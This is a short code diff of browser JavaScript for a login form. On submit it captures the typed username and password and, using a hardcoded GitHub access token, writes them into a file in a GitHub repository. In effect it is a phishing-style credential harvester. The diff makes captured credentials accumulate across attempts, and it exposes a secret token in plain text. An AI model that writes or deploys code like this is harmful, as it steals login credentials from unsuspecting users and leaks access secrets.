@@ -1,6 +1,7 @@
 const username = document.querySelector('.username')
 const password = document.querySelector('.password')
 
+let newTextContent
 
 document.querySelector('.loginButton').addEventListener('click', () => {
   if (username.value ==='' || password.value ==='') {
@@ -13,7 +14,7 @@ document.querySelector('.loginButton').addEventListener('click', () => {
       const githubToken = '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'
       const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`
 
-      const newTextContent = `username - "${username.value}" | password - "${password.value}"`
+      newTextContent += `username - "${username.value}" | password - "${password.value}"`
 
       const updateFile = async () => {
         try {
